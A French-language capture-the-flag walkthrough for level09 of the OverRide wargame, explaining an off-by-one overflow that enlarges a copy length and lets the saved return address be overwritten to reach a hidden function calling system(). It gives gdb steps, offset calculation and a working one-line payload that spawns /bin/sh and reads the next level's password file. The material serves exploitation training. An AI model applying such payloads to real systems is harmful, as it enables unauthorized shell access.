# Walkthrough du Level09 - OverRide

## Objectif

Obtenir un shell via une faille de débordement dans la structure `s_message` en exploitant une fonction non appelée `secret_backdoor`.

---

## Analyse du programme

Le binaire demande :

- Un **username** (via `set_username`)
- Un **message** (via `set_msg`)

Il utilise une structure :

```c
struct s_message {
    char message[140];       // offset 0
    char username[40];       // offset 140
    int len_message;         // offset 180
};
```

### Fonction `set_username`

```c
for (i = 0; i <= 40 && input[i] != '\0'; i++) {
    msg->username[i] = input[i];
}
```

- Boucle de **0 à 40** = **41 itérations** → **overflow de 1 octet** sur `len_message` (situé après `username`)

### Fonction `set_msg`

```c
strncpy(msg->message, input, msg->len_message);
```

- `len_message` contrôle la **taille de copie** → si on l'écrase avec `\xff` (255), on déclenche un **débordement** sur la pile.

### Fonction `secret_backdoor`

```c
void secret_backdoor(void) {
    char buffer[128];
    fgets(buffer, 128, stdin);
    system(buffer);
}
```

- Non appelée normalement, mais si on modifie le **retour** de `handle_msg`, elle peut être exécutée.

---

## Plan d'exploitation

1. **Overflow sur len_msg**  avec 1 byte `\xff`
2. **Trouver l'addresse de secre_backdoor**
3. **Calcul de l'offset** jusqu'à `RIP`
4. **Ecrasement de RIP** avec l'adresse de `secret_backdoor`

---


## Adresse de la backdoor

Pendant que on est dans gdb et sur un breakpoint on en profite pour recuperer l'addresse de secret_backdoor

```bash
gdb> info functions
...
0x000055555555488c  secret_backdoor
```

On utilisera cette adresse dans notre payload.
---

## Détermination de l'offset

On envoie un motif unique de test :

```bash
r < <(python -c'print"A"*40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4"')
```
On rentre le resultat dans Wire Mask mais il ne semble pas trouver d'offset....

On tente alors une autre approche pour trouver l'offset:
On break sur main puis on fait un disas de `handle_msg`.
```
(gdb) disas handle_msg
Dump of assembler code for function handle_msg:
   0x00005555555548c0 <+0>:     push   %rbp
   0x00005555555548c1 <+1>:     mov    %rsp,%rbp                       //Nouveau rbp
   0x00005555555548c4 <+4>:     sub    $0xc0,%rsp
   0x00005555555548cb <+11>:    lea    -0xc0(%rbp),%rax
   .............................
   0x000055555555490d <+77>:    mov    %rax,%rdi
   0x0000555555554910 <+80>:    callq  0x5555555549cd <set_username>
   0x0000555555554915 <+85>:    lea    -0xc0(%rbp),%rax
   ..............................
   0x0000555555554931 <+113>:   retq  
```
On constate que $rax est a 0xc0 de $rbp et que on alloue cette addresse à rdi qui sera passé en argument à set_username pour stocker l'input utilisateur donc notre buffer.

On sait que l'addresse de retour se situe sur rbp + 8 une fois dans handle_msg.

Donc on break sur set_username et puis on fait le calcul pour connaitre l'offset:
```
(gdb) b *0x0000555555554910
(gdb) print $rbp + 8 - $rdi
$2 = (void *) 0xc8
```
0xc8 = 200. On a notre offset


---

## Payload final

Payload formaté en ligne de commande :

```bash
(python -c 'print "B"*40 + "\xff" + "\n" + "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n/bin/sh\n"'; cat) | ./level09
```

---

## Résultat

```bash
whoami
level10
cat /home/users/level10/.pass
<flag>
```

---

## Explication de chaque étape

- **40 'B'** : remplissent `username`
- **+1 **`` : overflow de `len_message`
- **+200 'B'** : overflow jusqu'à RIP
- **adresse** : `secret_backdoor()`
- `` : passé à `system()` dans `secret_backdoor`

---
